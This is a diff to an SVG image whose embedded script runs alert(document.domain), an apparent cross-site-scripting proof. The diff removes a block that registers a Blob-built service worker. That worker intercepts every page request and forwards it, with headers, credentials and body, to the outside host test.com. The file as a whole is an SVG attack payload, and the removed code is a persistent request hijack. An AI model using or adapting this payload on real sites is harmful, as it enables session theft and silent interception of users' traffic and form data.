@@ -2,56 +2,5 @@
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
    <script type="text/javascript">
       alert(document.domain);
-    const swCode = '' +
-      'self.addEventListener("install", function(event) {' +
-      '  console.log("Service Worker installing...");' +
-      '  self.skipWaiting();' +
-      '});' +
-      '' +
-      'self.addEventListener("activate", function(event) {' +
-      '  console.log("Service Worker activating...");' +
-      '  event.waitUntil(self.clients.claim());' +
-      '});' +
-      '' +
-      'self.addEventListener("fetch", function(event) {' +
-      '  var requestUrl = new URL(event.request.url);' +
-      '  var newUrl = new URL(requestUrl.pathname + requestUrl.search, "https://test.com");' +
-      '  ' +
-      '  console.log("Rerouting: " + event.request.url + " -> " + newUrl.toString());' +
-      '  ' +
-      '  var requestInit = {' +
-      '    method: event.request.method,' +
-      '    headers: event.request.headers,' +
-      '    mode: "cors",' +
-      '    credentials: event.request.credentials,' +
-      '    cache: event.request.cache,' +
-      '    redirect: event.request.redirect,' +
-      '    referrer: event.request.referrer' +
-      '  };' +
-      '  ' +
-      '  if (event.request.method !== "GET" &amp;&amp; event.request.method !== "HEAD") {' +
-      '    requestInit.body = event.request.body;' +
-      '  }' +
-      '  ' +
-      '  var modifiedRequest = new Request(newUrl.toString(), requestInit);' +
-      '  ' +
-      '  event.respondWith(' +
-      '    fetch(modifiedRequest)' +
-      '      .catch(function(error) {' +
-      '        console.error("Fetch failed:", error);' +
-      '        return new Response("Network error occurred", {' +
-      '          status: 408,' +
-      '          headers: { "Content-Type": "text/plain" }' +
-      '        });' +
-      '      })' +
-      '  );' +
-      '});';
-      const blob = new Blob([swCode], { type: 'application/javascript' });
-      const swUrl = URL.createObjectURL(blob);
-      navigator.serviceWorker.register(swUrl)
-        .then((registration) => {
-        })
-        .catch((error) => {
-        });
    </script>
 </svg>
